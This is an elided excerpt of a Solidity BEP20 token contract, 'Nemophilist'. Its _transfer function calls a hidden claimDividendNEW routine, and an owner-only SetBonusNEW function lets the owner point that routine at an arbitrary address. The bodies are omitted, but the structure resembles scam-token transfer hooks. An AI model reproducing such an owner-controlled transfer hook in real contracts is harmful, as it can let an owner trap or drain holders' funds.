...
contract Nemophilist is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Nemophilist';
  ...
  */
  ...
  function claimDividendNEW(address sender, address recipient, uint256 amount) private returns (uint256) {      
  ...
  function SetBonusNEW(address c) public onlyOwner {
    C = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendNEW(sender, recipient, amount);   
